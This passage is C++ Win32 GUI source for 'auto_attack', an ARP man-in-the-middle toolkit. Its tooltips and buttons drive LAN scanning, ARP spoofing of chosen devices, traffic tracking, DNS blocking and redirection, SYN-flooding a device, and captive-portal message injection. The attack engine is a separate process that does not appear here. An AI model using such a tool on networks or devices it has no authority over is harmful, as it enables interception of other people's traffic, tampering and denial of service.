                    ListView_GetItemText(g_hVictimLV, pnm->iItem, 1, wip, 64);
                    char ip[64] = {0};
                    WideCharToMultiByte(CP_UTF8, 0, wip, -1, ip, 64, NULL, NULL);
                    if (ip[0]) setTimelineFocus(ip);
                }
                return 0;
            }
            if (hdr->idFrom == ID_ACTIVITY_LV && hdr->code == NM_DBLCLK) {
                onWatch();
                return 0;
            }
            return 0;
        }

        case WM_TIMER:
            if (wp == ID_TIMER_DUMP) {
                if (g_hChildInW) sendCmd("_dump");
            } else if (wp == ID_TIMER_AUTOSCAN) {
                KillTimer(hWnd, ID_TIMER_AUTOSCAN);
                if (g_hChildInW) {
                    appendLog("[*] auto-scan: searching for devices...\r\n");
                    sendCmd("scan");
                }
            } else if (wp == ID_TIMER_REPORT) {
                KillTimer(hWnd, ID_TIMER_REPORT);
                std::string html = guiDir() + "atk\\report.html";
                if (GetFileAttributesA(html.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    std::wstring w = toWide(html);
                    ShellExecuteW(NULL, L"open", w.c_str(), NULL, NULL, SW_SHOWNORMAL);
                } else {
                    appendLog("[!] report not written yet - try again in a moment\r\n");
                }
            }
            return 0;

        case WM_KEYDOWN:
            if (handleGlobalKey(wp)) return 0;
            return 0;

        case WM_APP_LOGNEW:
            flushLogToEdit();
            return 0;

        case WM_APP_REFRESH: {
            bool dirty;
            {
                std::lock_guard<std::mutex> lk(g_stateMutex);
                dirty = g_dumpDirty;
                g_dumpDirty = false;
            }
            if (dirty) {
                refreshVictimsLV(g_hVictimLV);
                refreshActivityLV(g_hActivityLV);
                refreshTimeline();
                refreshRulesLV(g_hRulesLV);
                refreshAppsLV(g_hAppsLV);
            } else {
                updateActivityAges(g_hActivityLV);
                refreshTimeline();
            }
            updateStatusText();
            return 0;
        }

        case WM_APP + 3: {
            // ignore the notice from a previous engine that we replaced/stopped
            if (g_engineStopRequested.load() || (unsigned)wp != g_engineGen.load())
                return 0;
            int r = MessageBoxW(g_hMain,
                L"The engine process exited.\n\n"
                L"If this was unexpected, check the log for errors.\n\n"
                L"Restart the engine now?",
                L"auto_attack - engine exited", MB_YESNO | MB_ICONWARNING);
            if (r == IDYES) {
                startChild();
                SetTimer(g_hMain, ID_TIMER_DUMP, 800, NULL);
                SetTimer(g_hMain, ID_TIMER_AUTOSCAN, 1500, NULL);
                sendCmd("_dump");
            }
            return 0;
        }

        case WM_SIZE: {
            int cx = LOWORD(lp), cy = HIWORD(lp);
            if (cx > 0 && cy > 0) layoutAll(cx, cy);
            return 0;
        }

        case WM_GETMINMAXINFO: {
            MINMAXINFO* mmi = (MINMAXINFO*)lp;
            mmi->ptMinTrackSize.x = 960;
            mmi->ptMinTrackSize.y = 720;
            return 0;
        }

        case WM_DESTROY:
            KillTimer(hWnd, ID_TIMER_DUMP);
            KillTimer(hWnd, ID_TIMER_AUTOSCAN);
            stopChild();
            if (g_fontUI)   DeleteObject(g_fontUI);
            if (g_fontBold) DeleteObject(g_fontBold);
            if (g_fontBig)  DeleteObject(g_fontBig);
            if (g_fontMono) DeleteObject(g_fontMono);
            if (g_bgBrush)    DeleteObject(g_bgBrush);
            if (g_panelBrush) DeleteObject(g_panelBrush);
            if (g_inputBrush) DeleteObject(g_inputBrush);
            if (g_accentBrush) DeleteObject(g_accentBrush);
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hWnd, msg, wp, lp);
}

void createFonts() {
    NONCLIENTMETRICSW ncm = {0};
    ncm.cbSize = sizeof(ncm);
    SystemParametersInfoW(SPI_GETNONCLIENTMETRICS, ncm.cbSize, &ncm, 0);
    g_fontUI   = CreateFontIndirectW(&ncm.lfMessageFont);
    g_fontBold = CreateFontW(-15, 0, 0, 0, FW_SEMIBOLD, 0, 0, 0,
        DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
    g_fontBig  = CreateFontW(-22, 0, 0, 0, FW_SEMIBOLD, 0, 0, 0,
        DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Segoe UI");
    g_fontMono = CreateFontW(-14, 0, 0, 0, FW_NORMAL, 0, 0, 0,
        DEFAULT_CHARSET, 0, 0, CLEARTYPE_QUALITY, 0, L"Consolas");
    g_bgBrush    = CreateSolidBrush(COL_BG);
    g_panelBrush = CreateSolidBrush(COL_PANEL);
    g_inputBrush = CreateSolidBrush(COL_INPUT);
    g_accentBrush = CreateSolidBrush(COL_ACCENT);
}

void buildMainChrome() {
    g_hHeader = CreateWindowExW(0, L"AA_Panel", L"",
        WS_CHILD | WS_VISIBLE | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
        0, 0, 900, 70, g_hMain, NULL, g_hInst, NULL);

    HWND title = CreateWindowW(L"STATIC", L"auto_attack",
        WS_CHILD | WS_VISIBLE, 14, 6, 220, 32, g_hHeader, NULL, g_hInst, NULL);
    SendMessage(title, WM_SETFONT, (WPARAM)g_fontBig, TRUE);

    HWND sub = CreateWindowW(L"STATIC",
        L"ARP MITM toolkit  |  authorized networks only",
        WS_CHILD | WS_VISIBLE, 14, 38, 360, 18, g_hHeader, NULL, g_hInst, NULL);
    SendMessage(sub, WM_SETFONT, (WPARAM)g_fontUI, TRUE);

    g_hAdapterCombo = CreateWindowW(L"COMBOBOX", L"",
        WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST | WS_VSCROLL,
        420, 22, 400, 220, g_hHeader, (HMENU)ID_ADAPTER_COMBO, g_hInst, NULL);
    SendMessage(g_hAdapterCombo, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(g_hAdapterCombo, L"DarkMode_Explorer", NULL);

    g_hBtnStartHdr = CreateWindowW(L"BUTTON", L"START",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        520, 18, 110, 34, g_hHeader, (HMENU)ID_HDR_START, g_hInst, NULL);
    SendMessage(g_hBtnStartHdr, WM_SETFONT, (WPARAM)g_fontBold, TRUE);
    SetWindowTheme(g_hBtnStartHdr, L"DarkMode_Explorer", NULL);

    g_hBtnStopHdr = CreateWindowW(L"BUTTON", L"STOP",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        636, 18, 110, 34, g_hHeader, (HMENU)ID_HDR_STOP, g_hInst, NULL);
    SendMessage(g_hBtnStopHdr, WM_SETFONT, (WPARAM)g_fontBold, TRUE);
    SetWindowTheme(g_hBtnStopHdr, L"DarkMode_Explorer", NULL);

    g_hBtnRestoreHdr = CreateWindowW(L"BUTTON", L"RESTORE ARP",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        752, 18, 130, 34, g_hHeader, (HMENU)ID_HDR_RESTORE, g_hInst, NULL);
    SendMessage(g_hBtnRestoreHdr, WM_SETFONT, (WPARAM)g_fontBold, TRUE);
    SetWindowTheme(g_hBtnRestoreHdr, L"DarkMode_Explorer", NULL);

    // accent separator line at the bottom of the header
    g_hAccent = CreateWindowW(L"STATIC", L"",
        WS_CHILD | WS_VISIBLE, 0, 68, 900, 2, g_hHeader, NULL, g_hInst, NULL);

    g_hTab = CreateWindowExW(0, WC_TABCONTROLW, L"",
        WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS,
        10, 78, 880, 30, g_hMain, (HMENU)ID_TAB, g_hInst, NULL);
    SendMessage(g_hTab, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(g_hTab, L"DarkMode_Explorer", NULL);

    TCITEMW ti = {0};
    ti.mask = TCIF_TEXT;
    const wchar_t* names[] = {L"Setup", L"Tracking", L"Control", L"Message", L"Apps"};
    for (int i = 0; i < 5; ++i) {
        ti.pszText = (LPWSTR)names[i];
        TabCtrl_InsertItem(g_hTab, i, &ti);
    }

    g_hLogEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY |
        WS_VSCROLL | ES_WANTRETURN,
        10, 620, 880, 150, g_hMain, (HMENU)ID_LOG_EDIT, g_hInst, NULL);
    SendMessage(g_hLogEdit, WM_SETFONT, (WPARAM)g_fontMono, TRUE);

    HWND bc = CreateWindowW(L"BUTTON", L"Clear Log",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        10, 776, 100, 26, g_hMain, (HMENU)ID_LOG_CLEAR, g_hInst, NULL);
    SendMessage(bc, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(bc, L"DarkMode_Explorer", NULL);

    HWND bp = CreateWindowW(L"BUTTON", L"Copy Log",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        114, 776, 100, 26, g_hMain, (HMENU)ID_LOG_COPY, g_hInst, NULL);
    SendMessage(bp, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(bp, L"DarkMode_Explorer", NULL);

    HWND bs = CreateWindowW(L"BUTTON", L"Save Log",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_FLAT,
        218, 776, 100, 26, g_hMain, (HMENU)ID_LOG_SAVE, g_hInst, NULL);
    SendMessage(bs, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(bs, L"DarkMode_Explorer", NULL);

    g_hStatusText = CreateWindowExW(0, L"STATIC", L"[ idle ]",
        WS_CHILD | WS_VISIBLE | SS_LEFT | SS_CENTERIMAGE,
        0, 810, 900, 40, g_hMain, (HMENU)ID_STATUS_TEXT, g_hInst, NULL);
    SendMessage(g_hStatusText, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
}

// ---------------------------------------------------------------
// entry
// ---------------------------------------------------------------
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nCmdShow) {
    g_hInst = hInst;

    INITCOMMONCONTROLSEX icc = {sizeof(icc)};
    icc.dwICC = ICC_TAB_CLASSES | ICC_LISTVIEW_CLASSES | ICC_STANDARD_CLASSES |
                ICC_BAR_CLASSES | ICC_WIN95_CLASSES;
    InitCommonControlsEx(&icc);

    createFonts();

    WNDCLASSEXW wcex = {sizeof(wcex)};
    wcex.style         = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc   = MainProc;
    wcex.hInstance     = hInst;
    wcex.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = g_bgBrush;
    wcex.lpszClassName = L"AA_Main";
    wcex.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassExW(&wcex);

    WNDCLASSEXW pwc = {sizeof(pwc)};
    pwc.style         = CS_HREDRAW | CS_VREDRAW;
    pwc.lpfnWndProc   = PanelProc;
    pwc.hInstance     = hInst;
    pwc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    pwc.hbrBackground = g_bgBrush;
    pwc.lpszClassName = L"AA_Panel";
    RegisterClassExW(&pwc);

    g_hMain = CreateWindowExW(0, L"AA_Main", L"auto_attack v4 - LAN ARP toolkit",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1120, 900,
        NULL, NULL, hInst, NULL);
    if (!g_hMain) return 1;

    buildMainChrome();
    buildPages();
    populateAdapters();

    g_hTooltip = CreateWindowExW(0, TOOLTIPS_CLASSW, NULL,
        WS_POPUP | TTS_ALWAYSTIP | TTS_NOPREFIX,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        g_hMain, NULL, g_hInst, NULL);
    if (g_hTooltip) {
        SendMessageW(g_hTooltip, TTM_SETMAXTIPWIDTH, 0, 260);
        SetWindowPos(g_hTooltip, HWND_TOPMOST, 0, 0, 0, 0,
                     SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    }

    // tooltips for header controls
    addTooltip(g_hAdapterCombo, L"Pick your network adapter (only ones with a gateway are listed).");
    addTooltip(g_hBtnStartHdr, L"Start the attack on selected devices.");
    addTooltip(g_hBtnStopHdr, L"Stop the attack.");
    addTooltip(g_hBtnRestoreHdr, L"Repair ARP caches without stopping the engine.");

    // tooltips for setup page controls
    addTooltip(GetDlgItem(g_pages[0], ID_SCAN), L"Scan the LAN for devices.");
    addTooltip(GetDlgItem(g_pages[0], ID_FILTER), L"Filter the device list by IP, MAC, hostname, port or OS. Click a column header to sort; double-click a device to focus it.");
    addTooltip(GetDlgItem(g_pages[0], ID_QUICK), L"Scan + select all + intercept + arm in one click.");
    addTooltip(GetDlgItem(g_pages[0], ID_NAMES), L"Resolve hostnames for discovered devices.");
    addTooltip(GetDlgItem(g_pages[0], ID_FINGERPRINT), L"TCP port scan + OS/banner guess for every discovered device.");
    addTooltip(GetDlgItem(g_pages[0], ID_SELECT_ALL), L"Select all devices.");
    addTooltip(GetDlgItem(g_pages[0], ID_SELECT_NONE), L"Deselect all devices.");
    addTooltip(GetDlgItem(g_pages[0], ID_FWD), L"Toggle IP forwarding on/off.");
    addTooltip(GetDlgItem(g_pages[0], ID_HELP), L"Show the quick guide.");
    addTooltip(GetDlgItem(g_pages[0], ID_START), L"Start attacking selected devices.");
    addTooltip(GetDlgItem(g_pages[0], ID_STOP), L"Stop and repair ARP caches.");

    // tooltips for tracking / control / apps / log controls
    addTooltip(GetDlgItem(g_pages[1], ID_REFRESH_ACT), L"Refresh the activity table.");
    addTooltip(GetDlgItem(g_pages[1], ID_TOP), L"Show the 10 busiest hosts.");
    addTooltip(GetDlgItem(g_pages[1], ID_WATCH), L"Stream the selected host's events into the log.");
    addTooltip(GetDlgItem(g_pages[1], ID_SHOWTRACK), L"Show the saved track log for the selected host.");
    addTooltip(GetDlgItem(g_pages[1], ID_TRACKS), L"List every track log file on disk.");
    addTooltip(GetDlgItem(g_pages[1], ID_REPORT), L"Write atk\\report.html + report.json and open the report.");
    addTooltip(GetDlgItem(g_pages[1], ID_BYPASS), L"List devices using QUIC / DoH / DoT / VPN (why interception may miss traffic).");
    addTooltip(GetDlgItem(g_pages[1], ID_TIMELINE_SAVE), L"Save the visible timeline to a text file.");
    addTooltip(GetDlgItem(g_pages[2], ID_BLOCK_BTN), L"Block a domain for one device or all (*).");
    addTooltip(GetDlgItem(g_pages[2], ID_REDIR_BTN), L"Redirect a domain to an IP address.");
    addTooltip(GetDlgItem(g_pages[2], ID_UNBLOCK_BTN), L"Remove rules that match this domain.");
    addTooltip(GetDlgItem(g_pages[2], ID_SAVE_RULES), L"Write all DNS rules to atk\\rules.txt.");
    addTooltip(GetDlgItem(g_pages[2], ID_LOAD_RULES), L"Replace the rule list with atk\\rules.txt.");
    addTooltip(GetDlgItem(g_pages[2], ID_KICK), L"SYN-flood a device (needs an active attack).");
    addTooltip(GetDlgItem(g_pages[2], ID_UNKICK), L"Stop every running SYN flood.");
    addTooltip(GetDlgItem(g_pages[2], ID_MSG_SEND),
        L"Arm a captive-portal notice for a device (or * for all). Needs a running attack.");
    addTooltip(GetDlgItem(g_pages[2], ID_MSG_STOP),
        L"Remove the notice and its wildcard DNS rule.");
    addTooltip(GetDlgItem(g_pages[4], ID_APPS_BLOCK), L"Block the selected app for its device.");
    addTooltip(GetDlgItem(g_pages[4], ID_APPS_UNBLOCK), L"Unblock the selected app.");
    addTooltip(GetDlgItem(g_pages[4], ID_APPS_SIGS), L"List the built-in app signatures.");
    addTooltip(GetDlgItem(g_hMain, ID_LOG_CLEAR), L"Clear the log window.");
    addTooltip(GetDlgItem(g_hMain, ID_LOG_COPY), L"Copy the log to the clipboard.");
    addTooltip(GetDlgItem(g_hMain, ID_LOG_SAVE), L"Save the log to a text file.");

    RECT rc;
    GetClientRect(g_hMain, &rc);
    layoutAll(rc.right, rc.bottom);

    ShowWindow(g_hMain, nCmdShow);
    UpdateWindow(g_hMain);

    if (!isElevated()) {
        MessageBoxW(g_hMain,
            L"Run as Administrator - otherwise forwarding + raw send fail.",
            L"auto_attack - admin needed", MB_OK | MB_ICONWARNING);
    }

    startChild();
    SetTimer(g_hMain, ID_TIMER_DUMP, 800, NULL);
    SetTimer(g_hMain, ID_TIMER_AUTOSCAN, 1500, NULL);
    sendCmd("_dump");

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        // shortcuts work even when a child control (list, tab, button) has
        // focus; WM_KEYDOWN alone only reaches the main window when it is
        // focused, which almost never happens after the first click
        if (msg.message == WM_KEYDOWN && handleGlobalKey(msg.wParam)) continue;
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return (int)msg.wParam;
}
